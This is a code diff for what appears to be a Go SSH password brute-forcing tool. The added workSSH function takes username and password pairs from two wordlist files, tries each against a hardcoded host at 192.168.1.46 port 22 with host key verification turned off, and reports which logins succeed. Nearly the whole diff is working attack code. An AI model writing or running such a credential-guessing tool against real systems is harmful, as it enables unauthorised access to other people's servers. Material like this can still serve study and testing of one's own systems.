@@ -3,11 +3,14 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"net"
 	"os"
 	"runtime"
 	"strconv"
 	"sync"
 	"time"
+
+	"golang.org/x/crypto/ssh"
 )
 
 func check(e error) {
@@ -68,8 +71,32 @@ func Read2Files(userFile, passFile string, loginChan chan login) {
 func workSSH(job login) {
 	// fmt.Println(yellow("[attemp] ", job.pos, " ", job.user, ":", job.pass))
 	defer wg.Done()
-	time.Sleep(time.Millisecond * 50)
-	fmt.Sprintln("[+][+] Session Connect ", job.pos, " ", job.user, ":", job.pass)
+	//SSH basic connection
+	config := &ssh.ClientConfig{
+		User: job.user,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(job.pass),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+
+	//Recover function
+	defer func() {
+		r := recover()
+		if r != nil {
+			fmt.Println(r)
+		}
+	}()
+
+	t := net.JoinHostPort("192.168.1.46", "22")
+
+	_, err := ssh.Dial("tcp", t, config)
+
+	if err != nil {
+		fmt.Println("[X] Failed to connect ", job.pos, " at ", t, " ", job.user, ":", job.pass)
+	} else {
+		fmt.Println("[+][+] Session Connect ", job.pos, " at ", t, " ", job.user, ":", job.pass)
+	}
 }
 
 //SSHattackStart SSH attack with 2 files to iterate
